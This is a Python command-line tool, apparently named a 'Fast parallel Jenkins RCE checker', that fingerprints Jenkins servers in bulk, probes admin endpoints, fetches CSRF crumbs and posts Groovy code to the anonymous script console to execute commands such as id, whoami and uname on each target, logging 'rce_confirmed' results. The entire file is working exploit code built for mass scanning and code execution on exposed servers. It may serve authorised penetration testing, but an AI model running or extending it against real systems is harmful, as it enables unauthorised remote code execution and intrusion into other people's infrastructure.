#!/usr/bin/env python3
import argparse
import html
import json
import os
import re
import ssl
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from http.cookiejar import CookieJar
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urlparse
from urllib.request import HTTPCookieProcessor, HTTPSHandler, Request, build_opener

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
SCANS = os.path.join(os.path.expanduser("~"), ".loki", "scans")
GROOVY = {
    "id": '["id"].execute().text',
    "whoami": '["whoami"].execute().text',
    "hostname": '["hostname"].execute().text',
    "pwd": '["pwd"].execute().text',
    "uname": '["uname","-a"].execute().text',
    "date": '["date"].execute().text',
}
ENDPOINTS = {
    "script": "/script",
    "scriptText": "/scriptText",
    "crumbIssuer": "/crumbIssuer/api/json",
    "api": "/api/json",
    "manage": "/manage",
    "configure": "/configure",
    "pluginManager": "/pluginManager/installed",
    "systemInfo": "/systemInfo",
}
PRINT_LOCK = threading.Lock()
IO_LOCK = threading.Lock()


def emit(msg):
    with PRINT_LOCK:
        print(msg, flush=True)


def normalize(target):
    target = target.strip()
    if not re.match(r"^https?://", target, re.I):
        target = "http://" + target
    return target.rstrip("/")


def opener(with_cookies=False):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers = [HTTPSHandler(context=ctx)]
    jar = None
    if with_cookies:
        jar = CookieJar()
        handlers.append(HTTPCookieProcessor(jar))
    return build_opener(*handlers), jar


def fetch(url, timeout=8, op=None, data=None, headers=None):
    op = op or opener()[0]
    hdrs = {"User-Agent": UA}
    if headers:
        hdrs.update(headers)
    req = Request(url, data=data, headers=hdrs)
    try:
        with op.open(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers.items()), resp.read().decode("utf-8", "replace")
    except HTTPError as e:
        return e.code, dict(e.headers.items()), e.read().decode("utf-8", "replace")
    except (URLError, OSError) as e:
        return 0, {}, str(e)


def parse_proof(text):
    pres = re.findall(r"<pre[^>]*>(.*?)</pre>", text, re.S | re.I)
    if pres:
        vals = [html.unescape(re.sub(r"<[^>]+>", "", p)).strip() for p in pres]
        vals = [v for v in vals if v]
        return vals[-1] if vals else ""
    return html.unescape(re.sub(r"<[^>]+>", "", text)).strip()[:2000]


def check_target(target, cmd="id", timeout=8, prefix=""):
    base = normalize(target)
    started = time.time()

    def log(msg):
        emit("%s%s" % (prefix, msg))

    log(base)
    root_code, root_hdr, root_body = fetch(base + "/", timeout)
    log("  GET / -> %s" % root_code)
    lower_hdr = {k.lower(): v for k, v in root_hdr.items()}
    version = lower_hdr.get("x-jenkins", "")
    if not version:
        found = re.search(r"Dashboard\s*-\s*Jenkins|Jenkins\s+\d+\.\d+", root_body, re.I)
        version = found.group(0) if found else ""
    is_jenkins = bool(version) or "x-hudson" in lower_hdr or "Dashboard - Jenkins" in root_body
    log("  Jenkins=%s version=%s" % (is_jenkins, version or "-"))

    codes = {}
    bodies = {}

    def probe(name, path):
        code, _, body = fetch(base + path, timeout)
        return name, code, body

    with ThreadPoolExecutor(max_workers=len(ENDPOINTS)) as ex:
        futures = [ex.submit(probe, name, path) for name, path in ENDPOINTS.items()]
        for fut in as_completed(futures):
            name, code, body = fut.result()
            codes[name] = code
            bodies[name] = body
            log("  GET %s -> %s" % (ENDPOINTS[name], code))

    script_anon = bool(re.search(r"name=[\"']script[\"']", bodies["script"], re.I))
    if not script_anon and codes["scriptText"] == 200 and "script" in bodies["scriptText"].lower():
        script_anon = True
    log("  anonymous_script_console=%s" % script_anon)

    crumb = ""
    if codes["crumbIssuer"] == 200:
        try:
            crumb = json.loads(bodies["crumbIssuer"]).get("crumb", "")
        except (ValueError, AttributeError):
            crumb = ""

    proof = ""
    proof_endpoint = None
    if script_anon and crumb:
        cop, _ = opener(with_cookies=True)
        log("  getting crumb ...")
        fetch(base + "/crumbIssuer/api/json", timeout, cop)
        _, _, crumb_body = fetch(base + "/crumbIssuer/api/json", timeout, cop)
        try:
            crumb = json.loads(crumb_body).get("crumb", crumb)
        except (ValueError, AttributeError):
            pass
        log("  crumb=%s" % ("ok" if crumb else "failed"))
        data = urlencode({"script": GROOVY[cmd], "Submit": "Run"}).encode()
        headers = {"Jenkins-Crumb": crumb, "Content-Type": "application/x-www-form-urlencoded"}
        proof_endpoint = "/scriptText" if codes["scriptText"] == 200 else "/script"
        log("  POST %s (%s) ..." % (proof_endpoint, cmd))
        _, _, out = fetch(base + proof_endpoint, timeout, cop, data=data, headers=headers)
        proof = parse_proof(out)
        log("  proof=%s" % (proof or "empty"))

    if not is_jenkins:
        verdict = "not_jenkins"
    elif not script_anon:
        verdict = "no_anonymous_script_console"
    elif proof:
        verdict = "rce_confirmed"
    else:
        verdict = "script_console_anonymous_proof_failed"
    log("  verdict=%s (%.1fs)" % (verdict, time.time() - started))

    return {
        "url": base,
        "version": version,
        "is_jenkins": is_jenkins,
        "verdict": verdict,
        "anonymous_script_console": script_anon,
        "proof_endpoint": proof_endpoint,
        "proof": proof or None,
        "endpoints": {"root": root_code, **codes},
    }


def safe_name(url):
    host = urlparse(url).netloc or url
    return re.sub(r"[^A-Za-z0-9._-]", "_", host)


def write_json(result, out=None):
    os.makedirs(SCANS, exist_ok=True)
    if not out:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = os.path.join(SCANS, "jenkins_rce_%s_%s.json" % (safe_name(result["url"]), ts))
    with IO_LOCK:
        with open(out, "w", encoding="utf-8") as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
    return out


def main():
    p = argparse.ArgumentParser(description="Fast parallel Jenkins RCE checker")
    p.add_argument("targets", nargs="*", help="url or host[:port]")
    p.add_argument("-l", "--list", "--file", dest="list_file", help="file with targets, one per line")
    p.add_argument("-c", "--cmd", choices=sorted(GROOVY), default="id")
    p.add_argument("-o", "--output", help="output json (single) or jsonl (batch)")
    p.add_argument("-p", "--parallel", type=int, default=8, help="parallel targets (default 8)")
    p.add_argument("--timeout", type=int, default=8, help="per-request timeout (default 8s)")
    args = p.parse_args()

    targets = list(args.targets)
    if args.list_file:
        try:
            with open(args.list_file, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except OSError as e:
            print("[!] cannot read %s: %s" % (args.list_file, e), file=sys.stderr)
            return 2
    if not targets:
        p.print_usage(sys.stderr)
        return 2

    batch = bool(args.list_file) or len(targets) > 1
    batch_out = args.output
    if batch and not batch_out:
        os.makedirs(SCANS, exist_ok=True)
        batch_out = os.path.join(SCANS, "jenkins_rce_batch_%s.jsonl" % datetime.now().strftime("%Y%m%d_%H%M%S"))
        with open(batch_out, "w", encoding="utf-8"):
            pass

    results = [None] * len(targets)
    workers = max(1, min(args.parallel, len(targets)))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {}
        for i, target in enumerate(targets):
            prefix = "[%d/%d] " % (i + 1, len(targets)) if batch else ""
            futures[ex.submit(check_target, target, args.cmd, args.timeout, prefix)] = i
        for fut in as_completed(futures):
            i = futures[fut]
            result = fut.result()
            results[i] = result
            out = write_json(result, None if batch else args.output)
            if batch:
                with IO_LOCK:
                    with open(batch_out, "a", encoding="utf-8") as f:
                        f.write(json.dumps(result, ensure_ascii=False) + "\n")
            prefix = "[%d/%d] " % (i + 1, len(targets)) if batch else ""
            emit("%sRESULT %s  %s  version=%s  proof=%s" % (
                prefix, result["url"], result["verdict"], result["version"] or "-",
                (result["proof"] or "-")[:60].replace("\n", " ")))
            if not batch:
                emit("Отчёт: %s" % out)

    emit("\n=== ИТОГИ ===")
    for i, r in enumerate(results, 1):
        emit("%2d. %-30s %-38s %s" % (i, r["url"], r["verdict"], r["version"] or "-"))
    if batch:
        emit("\nСводка: %s" % batch_out)
        counts = Counter(r["verdict"] for r in results)
        for verdict, n in counts.most_common():
            emit("  %s %s" % (n, verdict))
    return 0


if __name__ == "__main__":
    sys.exit(main())
